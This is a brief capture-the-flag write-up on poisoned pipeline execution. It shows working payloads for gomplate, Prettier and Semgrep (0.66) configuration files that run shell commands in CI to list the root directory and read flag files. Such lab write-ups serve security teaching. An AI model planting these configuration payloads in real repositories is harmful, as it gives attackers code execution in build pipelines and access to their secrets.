GOD Code Pipelines showcases multiple instances of indirect poisoned pipeline execution. The player were expected to push commits such to change the expected behavior of the tool/scanner/linter when running on untrusted code.

changelog: you had to push a gomplate configuration to run a command after generating the readme
# .gomplate.yaml
postExec:
- "sh"
- "-c"
- "ls -la /; cat /flag*"


prettier: Prettier uses a configuration library called cosmiconfig that priotize JavaScript configuration over the TOML configuration that the repository used. 

// .prettierrc.js
require('child_process').execSync('(ls -la /; cat /flag*) >&2');


semgrep: This CI uses Semgrep version 0.66, the last version to support operators written in Python. You needed to modify the semgrep output format config to allow running Python and then add a Semgrep rule that would execute a command.

diff --git a/.semgrep.config.json b/.semgrep.config.json
index b50a2ef..ac9a396 100644
--- a/.semgrep.config.json
+++ b/.semgrep.config.json
@@ -1,5 +1,5 @@
 {
-    "format": "emacs",
+    "format": "dangerously-allow-arbitrary-code-execution-from-rules",
     "config": [".semgrep"],
     "verbose": true
 }
diff --git a/.semgrep/ban-os-system.yml b/.semgrep/ban-os-system.yml
index a3b8999..f61138e 100644
--- a/.semgrep/ban-os-system.yml
+++ b/.semgrep/ban-os-system.yml
@@ -6,3 +6,5 @@ rules:
     patterns:
       - pattern: |
           os.system(...)
+      - pattern-where-python: |
+          __import__("os").system("ls -la /; cat /flag*")